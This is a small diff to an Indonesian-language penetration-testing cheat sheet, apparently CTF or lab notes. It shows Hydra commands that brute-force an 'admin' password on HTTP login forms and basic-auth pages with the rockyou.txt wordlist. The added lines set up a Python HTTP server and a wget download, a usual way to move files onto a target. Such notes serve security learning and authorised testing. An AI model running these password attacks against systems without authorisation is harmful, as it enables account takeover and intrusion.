@@ -111,3 +111,10 @@ hydra -l admin -P rockyou.txt target_ip http-post-form "/login.php:username=^USE
 
 Untuk http basic auth:
 hydra -l admin -P rockyou.txt target_ip http-get /admin
+
+
+Untuk buka http service:
+python3 -m http.server 80
+
+wget http://ip-server:port/file
+
